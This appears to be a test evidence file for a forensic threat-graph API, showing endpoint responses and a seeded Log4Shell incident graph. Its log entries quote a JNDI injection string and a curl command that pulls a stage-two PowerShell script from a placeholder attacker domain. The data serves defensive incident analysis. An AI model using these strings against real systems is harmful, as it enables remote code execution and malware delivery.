@@ -1,0 +1,600 @@
+# Evidence: API Endpoints Verification
+# Timestamp: 2026-09-23T14:21:02.924667+00:00
+
+=== GET / ===
+Status: 200, Content-Type: application/json
+{
+  "name": "EvidenceGraphAI",
+  "version": "0.1.0",
+  "environment": "development"
+}
+
+=== GET /health ===
+Status: 200, Content-Type: application/json
+{
+  "status": "healthy",
+  "services": {
+    "neo4j": "healthy",
+    "postgres": "healthy",
+    "redis": "healthy",
+    "minio": "healthy"
+  }
+}
+
+=== GET /graph/stats ===
+Status: 200, Content-Type: application/json
+{
+  "node_counts": {
+    "LogEntry": 3,
+    "ATT&CKTechnique": 3,
+    "Certificate": 2,
+    "IPAddress": 2,
+    "Domain": 2,
+    "CVE": 1,
+    "EvidenceArtifact": 1,
+    "Attacker": 1,
+    "Victim": 1,
+    "Malware": 1
+  },
+  "edge_counts": {
+    "MAPS_TO": 3,
+    "COMMUNICATES_WITH": 3,
+    "EXPECTED_TO_LEAD_TO": 2,
+    "PRECEDES": 2,
+    "RESOLVES_TO": 2,
+    "USES_CERTIFICATE": 2,
+    "DELIVERS": 1,
+    "EXPLOITS": 1,
+    "DERIVED_FROM": 1,
+    "HAS_RESPONSE": 1
+  },
+  "totals": {
+    "nodes": 17,
+    "edges": 18
+  },
+  "active_node_count": 17
+}
+
+=== GET /graph/export ===
+Status: 200, Content-Type: application/json
+{
+  "nodes": [
+    {
+      "id": "CVE-2021-44228",
+      "updated_at": "2026-09-23T14:20:04.320823+00:00",
+      "description": "Log4Shell \u2014 Remote Code Execution in Apache Log4j2",
+      "valid_from": "2026-09-23T14:20:04.320823+00:00",
+      "created_at": "2026-09-23T14:20:04.320823+00:00",
+      "source_agent": "system",
+      "severity": "CRITICAL",
+      "confidence": 1.0,
+      "cvss_score": 10.0,
+      "_labels": [
+        "CVE"
+      ]
+    },
+    {
+      "id": "cert-c2-log4shell-2",
+      "fingerprint": "11:22:33:44:55:66:77:88:99:aa:bb:cc:dd:ee:ff:00:11:22:33:44",
+      "updated_at": "2026-09-23T14:20:04.470976+00:00",
+      "issuer": "Self-Signed",
+      "subject": "CN=payload.log4shell-actor.example",
+      "valid_from": "2026-09-23T14:20:04.470976+00:00",
+      "created_at": "2026-09-23T14:20:04.470976+00:00",
+      "source_agent": "system",
+      "confidence": 0.7,
+      "_labels": [
+        "Certificate"
+      ]
+    },
+    {
+      "id": "ip-attacker-c2-1",
+      "updated_at": "2026-09-23T14:20:04.375657+00:00",
+      "valid_from": "2026-09-23T14:20:04.375657+00:00",
+      "created_at": "2026-09-23T14:20:04.375657+00:00",
+      "asn": 64496,
+      "source_agent": "system",
+      "addr": "198.51.100.10",
+      "confidence": 0.85,
+      "country": "XX",
+      "_labels": [
+        "IPAddress"
+      ]
+    },
+    {
+      "id": "log-initial-exploit-attempt",
+      "message": "JNDI injection attempt detected: ${jndi:ldap://198.51.100.10/a}",
+      "timestamp": "2021-12-10T08:15:22+00:00",
+      "updated_at": "2026-09-23T14:20:04.546421+00:00",
+      "source": "WAF",
+      "valid_from": "2026-09-23T14:20:04.546421+00:00",
+      "event_id": 10001,
+      "created_at": "2026-09-23T14:20:04.546421+00:00",
+      "source_agent": "system",
+      "confidence": 0.99,
+      "_labels": [
+        "LogEntry"
+      ]
+    },
+    {
+      "id": "ip-attacker-c2-2",
+      "updated_at": "2026-09-23T14:20:04.405056+00:00",
+      "valid_from": "2026-09-23T14:20:04.405056+00:00",
+      "created_at": "2026-09-23T14:20:04.405056+00:00",
+      "asn": 64496,
+      "source_agent": "system",
+      "addr": "198.51.100.20",
+      "confidence": 0.75,
+      "country": "XX",
+      "_labels": [
+        "IPAddress"
+      ]
+    },
+    {
+      "id": "log-c2-connection",
+      "message": "Outbound HTTPS connection to 198.51.100.10:443 from 203.0.113.50",
+      "timestamp": "2021-12-10T08:15:45+00:00",
+      "updated_at": "2026-09-23T14:20:04.571105+00:00",
+      "source": "Firewall",
+      "valid_from": "2026-09-23T14:20:04.571105+00:00",
+      "event_id": 20002,
+      "created_at": "2026-09-23T14:20:04.571105+00:00",
+      "source_agent": "system",
+      "confidence": 0.95,
+      "_labels": [
+        "LogEntry"
+      ]
+    },
+    {
+      "id": "artifact-pcap-log4shell-incident",
+      "updated_at": "2026-09-23T14:20:04.585867+00:00",
+      "storage_path": "minio://evidencegraphai-artifacts/log4shell/capture_2021-12-10.pcap",
+      "valid_from": "2026-09-23T14:20:04.585867+00:00",
+      "hash_sha256": "b94f6f125c79e3a5ffaa826f584c10d52ada669e6762051b826b55776d05a8c",
+      "created_at": "2026-09-23T14:20:04.585867+00:00",
+      "source_agent": "system",
+      "artifact_type": "PCAP",
+      "confidence": 1.0,
+      "_labels": [
+        "EvidenceArtifact"
+      ]
+    },
+    {
+      "id": "domain-c2-log4shell-1",
+      "updated_at": "2026-09-23T14:20:04.412481+00:00",
+      "registrar": "Unknown Registrar",
+      "valid_from": "2026-09-23T14:20:04.412481+00:00",
+      "name": "c2.log4shell-actor.example",
+      "created_at": "2026-09-23T14:20:04.412481+00:00",
+      "source_agent": "system",
+      "confidence": 0.9,
+      "_labels": [
+        "Domain"
+      ]
+    },
+    {
+      "country_of_origin": "Unknown",
+      "id": "attacker-apt-log4shell",
+      "updated_at": "2026-09-23T14:20:04.344064+00:00",
+      "valid_from": "2026-09-23T14:20:04.344064+00:00",
+      "name": "Unknown APT (Log4Shell)",
+      "created_at": "2026-09-23T14:20:04.344064+00:00",
+      "source_agent": "system",
+      "confidence": 0.8,
+      "aliases": [
+        "Log4Shell Actor"
+      ],
+      "_labels": [
+        "Attacker"
+      ]
+    },
+    {
+      "id": "domain-c2-log4shell-2",
+      "updated_at": "2026-09-23T14:20:04.438876+00:00",
+      "registrar": "Unknown Registrar",
+      "valid_from": "2026-09-23T14:20:04.438876+00:00",
+      "name": "payload.log4shell-actor.example",
+      "created_at": "2026-09-23T14:20:04.438876+00:00",
+      "source_agent": "system",
+      "confidence": 0.85,
+      "_labels": [
+        "Domain"
+      ]
+    },
+    {
+      "id": "cert-c2-log4shell-1",
+      "fingerprint": "aa:bb:cc:dd:ee:ff:00:11:22:33:44:55:66:77:88:99:aa:bb:cc:dd",
+      "updated_at": "2026-09-23T14:20:04.446877+00:00",
+      "issuer": "Let's Encrypt",
+      "subject": "CN=c2.log4shell-actor.example",
+      "valid_from": "2026-09-23T14:20:04.446877+00:00",
+      "created_at": "2026-09-23T14:20:04.446877+00:00",
+      "source_agent": "system",
+      "confidence": 0.9,
+      "_labels": [
+        "Certificate"
+      ]
+    },
+    {
+      "id": "T1190",
+      "updated_at": "2026-09-23T14:20:04.503094+00:00",
+      "valid_from": "2026-09-23T14:20:04.503094+00:00",
+      "name": "Exploit Public-Facing Application",
+      "tactic": "Initial Access",
+      "created_at": "2026-09-23T14:20:04.503094+00:00",
+      "source_agent": "system",
+      "confidence": 1.0,
+      "_labels": [
+        "ATT&CKTechnique"
+      ]
+    },
+    {
+      "id": "T1059.001",
+      "updated_at": "2026-09-23T14:20:04.530504+00:00",
+      "valid_from": "2026-09-23T14:20:04.530504+00:00",
+      "name": "Command and Scripting Interpreter: PowerShell",
+      "tactic": "Execution",
+      "created_at": "2026-09-23T14:20:04.530504+00:00",
+      "source_agent": "system",
+      "confidence": 0.9,
+      "_labels": [
+        "ATT&CKTechnique"
+      ]
+    },
+    {
+      "id": "T1041",
+      "updated_at": "2026-09-23T14:20:04.537926+00:00",
+      "valid_from": "2026-09-23T14:20:04.537926+00:00",
+      "name": "Exfiltration Over C2 Channel",
+      "tactic": "Exfiltration",
+      "created_at": "2026-09-23T14:20:04.537926+00:00",
+      "source_agent": "system",
+      "confidence": 0.85,
+      "_labels": [
+        "ATT&CKTechnique"
+      ]
+    },
+    {
+      "id": "log-payload-download",
+      "message": "Suspicious PowerShell execution: curl payload.log4shell-actor.example/stage2.ps1",
+      "timestamp": "2021-12-10T08:16:03+00:00",
+      "updated_at": "2026-09-23T14:20:04.578862+00:00",
+      "source": "EDR",
+      "valid_from": "2026-09-23T14:20:04.578862+00:00",
+      "event_id": 30003,
+      "created_at": "2026-09-23T14:20:04.578862+00:00",
+      "source_agent": "system",
+      "confidence": 0.95,
+      "_labels": [
+        "LogEntry"
+      ]
+    },
+    {
+      "id": "victim-acme-corp",
+      "sector": "Finance",
+      "ip_address": "203.0.113.50",
+      "updated_at": "2026-09-23T14:20:04.356055+00:00",
+      "valid_from": "2026-09-23T14:20:04.356055+00:00",
+      "name": "ACME Corporation",
+      "created_at": "2026-09-23T14:20:04.356055+00:00",
+      "source_agent": "system",
+      "confidence": 1.0,
+      "_labels": [
+        "Victim"
+      ]
+    },
+    {
+      "id": "malware-mirai-log4shell",
+      "updated_at": "2026-09-23T14:20:04.366014+00:00",
+      "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "valid_from": "2026-09-23T14:20:04.366014+00:00",
+      "family": "Mirai",
+      "created_at": "2026-09-23T14:20:04.366014+00:00",
+      "source_agent": "system",
+      "confidence": 0.9,
+      "malware_type": "Botnet",
+      "_labels": [
+        "Malware"
+      ]
+    }
+  ],
+  "edges": [
+    {
+      "id": "6800fdcb-6290-4585-be04-ddb5510a3111",
+      "from_id": "log-initial-exploit-attempt",
+      "to_id": "artifact-pcap-log4shell-incident",
+      "type": "DERIVED_FROM",
+      "properties": {
+        "id": "6800fdcb-6290-4585-be04-ddb5510a3111",
+        "updated_at": "2026-09-23T14:20:05.156627+00:00",
+        "valid_from": "2026-09-23T14:20:05.156627+00:00",
+        "created_at": "2026-09-23T14:20:05.156627+00:00",
+        "source_agent": "system",
+        "confidence": 1.0,
+        "extraction_method": "PCAP parsing"
+      }
+    },
+    {
+      "id": "5ed83142-629d-4c99-b70f-8580bc2499db",
+      "from_id": "log-initial-exploit-attempt",
+      "to_id": "log-c2-connection",
+      "type": "PRECEDES",
+      "properties": {
+        "id": "5ed83142-629d-4c99-b70f-8580bc2499db",
+        "updated_at": "2026-09-23T14:20:05.021761+00:00",
+        "valid_from": "2026-09-23T14:20:05.021761+00:00",
+        "time_delta_ms": 23000,
+        "created_at": "2026-09-23T14:20:05.021761+00:00",
+        "source_agent": "system",
+        "confidence": 1.0
+      }
+    },
+    {
+      "id": "3a1132d5-0404-444a-b0d5-f539b1c8d079",
+      "from_id": "log-initial-exploit-attempt",
+      "to_id": "T1190",
+      "type": "MAPS_TO",
+      "properties": {
+        "id": "3a1132d5-0404-444a-b0d5-f539b1c8d079",
+        "updated_at": "2026-09-23T14:20:04.958974+00:00",
+        "valid_from": "2026-09-23T14:20:04.958974+00:00",
+        "mapping_confidence": 0.99,
+        "created_at": "2026-09-23T14:20:04.958974+00:00",
+        "source_agent": "system",
+        "confidence": 1.0
+      }
+    },
+    {
+      "id": "de464e85-32ac-4750-b39d-93b633552f96",
+      "from_id": "log-c2-connection",
+      "to_id": "log-payload-download",
+      "type": "PRECEDES",
+      "properties": {
+        "id": "de464e85-32ac-4750-b39d-93b633552f96",
+        "updated_at": "2026-09-23T14:20:05.060981+00:00",
+        "valid_from": "2026-09-23T14:20:05.060981+00:00",
+        "time_delta_ms": 18000,
+        "created_at": "2026-09-23T14:20:05.060981+00:00",
+        "source_agent": "system",
+        "confidence": 1.0
+      }
+    },
+    {
+      "id": "5242e426-c6f3-4897-a95a-787fa3b4528c",
+      "from_id": "log-c2-connection",
+      "to_id": "T1041",
+      "type": "MAPS_TO",
+      "properties": {
+        "id": "5242e426-c6f3-4897-a95a-787fa3b4528c",
+        "updated_at": "2026-09-23T14:20:05.006963+00:00",
+        "valid_from": "2026-09-23T14:20:05.006963+00:00",
+        "mapping_confidence": 0.9,
+        "created_at": "2026-09-23T14:20:05.006963+00:00",
+        "source_agent": "system",
+        "confidence": 1.0
+      }
+    },
+    {
+      "id": "14ce0ba1-91f6-43a1-9674-cd4b68658507",
+      "from_id": "domain-c2-log4shell-1",
+      "to_id": "cert-c2-log4shell-1",
+      "type": "USES_CERTIFICATE",
+      "properties": {
+        "id": "14ce0ba1-91f6-43a1-9674-cd4b68658507",
+        "validation_status": "valid",
+        "updated_at": "2026-09-23T14:20:04.874595+00:00",
+        "valid_from": "2026-09-23T14:20:04.874595+00:00",
+        "created_at": "2026-09-23T14:20:04.874595+00:00",
+        "source_agent": "system",
+        "confidence": 1.0
+      }
+    },
+    {
+      "id": "4ff21adb-3fd5-46a4-a7a2-be943a1ef17e",
+      "from_id": "domain-c2-log4shell-1",
+      "to_id": "ip-attacker-c2-1",
+      "type": "RESOLVES_TO",
+      "properties": {
+        "resolved_at": "2021-12-10T08:00:00+00:00",
+        "id": "4ff21adb-3fd5-46a4-a7a2-be943a1ef17e",
+        "updated_at": "2026-09-23T14:20:04.816528+00:00",
+        "valid_from": "2026-09-23T14:20:04.816528+00:00",
+        "created_at": "2026-09-23T14:20:04.816528+00:00",
+        "source_agent": "system",
+        "confidence": 1.0
+      }
+    },
+    {
+      "id": "d39b7b0d-cb37-4ba5-9b35-fce11fa4aea7",
+      "from_id": "attacker-apt-log4shell",
+      "to_id": "malware-mirai-log4shell",
+      "type": "DELIVERS",
+      "properties": {
+        "id": "d39b7b0d-cb37-4ba5-9b35-fce11fa4aea7",
+        "updated_at": "2026-09-23T14:20:04.684817+00:00",
+        "valid_from": "2026-09-23T14:20:04.684817+00:00",
+        "delivery_method": "JNDI Callback",
+        "created_at": "2026-09-23T14:20:04.684817+00:00",
+        "source_agent": "system",
+        "confidence": 1.0
+      }
+    },
+    {
+      "id": "b8052bff-7fae-4c0e-a292-497adf69ab6a",
+      "from_id": "attacker-apt-log4shell",
+      "to_id": "CVE-2021-44228",
+      "type": "EXPLOITS",
+      "properties": {
+        "id": "b8052bff-7fae-4c0e-a292-497adf69ab6a",
+        "updated_at": "2026-09-23T14:20:04.671780+00:00",
+        "valid_from": "2026-09-23T14:20:04.671780+00:00",
+        "vector": "LDAP JNDI Injection",
+        "created_at": "2026-09-23T14:20:04.671780+00:00",
+        "source_agent": "system",
+        "confidence": 1.0
+      }
+    },
+    {
+      "id": "21c8db9f-7a55-4692-8eec-792b1fa37beb",
+      "from_id": "domain-c2-log4shell-2",
+      "to_id": "cert-c2-log4shell-2",
+      "type": "USES_CERTIFICATE",
+      "properties": {
+        "id": "21c8db9f-7a55-4692-8eec-792b1fa37beb",
+        "validation_status": "self-signed",
+        "updated_at": "2026-09-23T14:20:04.921450+00:00",
+        "valid_from": "2026-09-23T14:20:04.921450+00:00",
+        "created_at": "2026-09-23T14:20:04.921450+00:00",
+        "source_agent": "system",
+        "confidence": 1.0
+      }
+    },
+    {
+      "id": "e6b21f92-a01b-40ef-808d-fc4c2743e9d4",
+      "from_id": "domain-c2-log4shell-2",
+      "to_id": "ip-attacker-c2-2",
+      "type": "RESOLVES_TO",
+      "properties": {
+        "resolved_at": "2021-12-10T08:00:00+00:00",
+        "id": "e6b21f92-a01b-40ef-808d-fc4c2743e9d4",
+        "updated_at": "2026-09-23T14:20:04.867084+00:00",
+        "valid_from": "2026-09-23T14:20:04.867084+00:00",
+        "created_at": "2026-09-23T14:20:04.867084+00:00",
+        "source_agent": "system",
+        "confidence": 1.0
+      }
+    },
+    {
+      "id": "cd0a9f39-8656-4dce-bc46-fd445711034e",
+      "from_id": "T1190",
+      "to_id": "T1059.001",
+      "type": "EXPECTED_TO_LEAD_TO",
+      "properties": {
+        "id": "cd0a9f39-8656-4dce-bc46-fd445711034e",
+        "updated_at": "2026-09-23T14:20:05.099781+00:00",
+        "valid_from": "2026-09-23T14:20:05.099781+00:00",
+        "created_at": "2026-09-23T14:20:05.099781+00:00",
+        "source_agent": "system",
+        "probability": 0.7,
+        "confidence": 1.0
+      }
+    },
+    {
+      "id": "47a10182-9f5f-4284-8046-0a58b9c998f6",
+      "from_id": "T1059.001",
+      "to_id": "T1041",
+      "type": "EXPECTED_TO_LEAD_TO",
+      "properties": {
+        "id": "47a10182-9f5f-4284-8046-0a58b9c998f6",
+        "updated_at": "2026-09-23T14:20:05.148109+00:00",
+        "valid_from": "2026-09-23T14:20:05.148109+00:00",
+        "created_at": "2026-09-23T14:20:05.148109+00:00",
+        "source_agent": "system",
+        "probability": 0.6,
+        "confidence": 1.0
+      }
+    },
+    {
+      "id": "06b4c466-9d08-446e-8ce4-43e4b14ee609",
+      "from_id": "log-payload-download",
+      "to_id": "T1059.001",
+      "type": "MAPS_TO",
+      "properties": {
+        "id": "06b4c466-9d08-446e-8ce4-43e4b14ee609",
+        "updated_at": "2026-09-23T14:20:05.013858+00:00",
+        "valid_from": "2026-09-23T14:20:05.013858+00:00",
+        "mapping_confidence": 0.95,
+        "created_at": "2026-09-23T14:20:05.013858+00:00",
+        "source_agent": "system",
+        "confidence": 1.0
+      }
+    },
+    {
+      "id": "a076cd5e-17aa-4484-956d-6b58255af0ee",
+      "from_id": "victim-acme-corp",
+      "to_id": "artifact-pcap-log4shell-incident",
+      "type": "HAS_RESPONSE",
+      "properties": {
+        "id": "a076cd5e-17aa-4484-956d-6b58255af0ee",
+        "updated_at": "2026-09-23T14:20:05.201398+00:00",
+        "status": "investigating",
+        "valid_from": "2026-09-23T14:20:05.201398+00:00",
+        "created_at": "2026-09-23T14:20:05.201398+00:00",
+        "source_agent": "system",
+        "confidence": 1.0
+      }
+    },
+    {
+      "id": "53b4f0cf-3b22-45f8-85b0-9454f492d6be",
+      "from_id": "victim-acme-corp",
+      "to_id": "ip-attacker-c2-1",
+      "type": "COMMUNICATES_WITH",
+      "properties": {
+        "port": 443,
+        "id": "53b4f0cf-3b22-45f8-85b0-9454f492d6be",
+        "protocol": "HTTPS",
+        "updated_at": "2026-09-23T14:20:04.806426+00:00",
+        "valid_from": "2026-09-23T14:20:04.806426+00:00",
+        "created_at": "2026-09-23T14:20:04.806426+00:00",
+        "source_agent": "system",
+        "confidence": 1.0
+      }
+    },
+    {
+      "id": "9314330d-0ec3-4ca6-8793-cefa0befeb91",
+      "from_id": "malware-mirai-log4shell",
+      "to_id": "ip-attacker-c2-2",
+      "type": "COMMUNICATES_WITH",
+      "properties": {
+        "port": 80,
+        "id": "9314330d-0ec3-4ca6-8793-cefa0befeb91",
+        "protocol": "HTTP",
+        "updated_at": "2026-09-23T14:20:04.795437+00:00",
+        "valid_from": "2026-09-23T14:20:04.795437+00:00",
+        "created_at": "2026-09-23T14:20:04.795437+00:00",
+        "source_agent": "system",
+        "confidence": 1.0
+      }
+    },
+    {
+      "id": "45e04d2b-615a-4392-aa5e-34e37e0a490d",
+      "from_id": "malware-mirai-log4shell",
+      "to_id": "ip-attacker-c2-1",
+      "type": "COMMUNICATES_WITH",
+      "properties": {
+        "port": 443,
+        "id": "45e04d2b-615a-4392-aa5e-34e37e0a490d",
+        "protocol": "HTTPS",
+        "updated_at": "2026-09-23T14:20:04.735747+00:00",
+        "valid_from": "2026-09-23T14:20:04.735747+00:00",
+        "created_at": "2026-09-23T14:20:04.735747+00:00",
+        "source_agent": "system",
+        "confidence": 1.0
+      }
+    }
+  ],
+  "node_count": 17,
+  "edge_count": 18
+}
+
+=== GET /graph/validate ===
+Status: 200, Content-Type: application/json
+{
+  "violations": [],
+  "total": 0,
+  "summary": {
+    "error": 0,
+    "warning": 0,
+    "info": 0
+  }
+}
+
+=== GET /dev/viewer ===
+Status: 200, Content-Type: text/html
+Body length: 19878 bytes, Title: <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>EvidenceGraphAI — Developer Graph Viewer</title>
+  <meta name="description" content="Developer-only graph visualization tool for EvidenceGraphAI. Not...
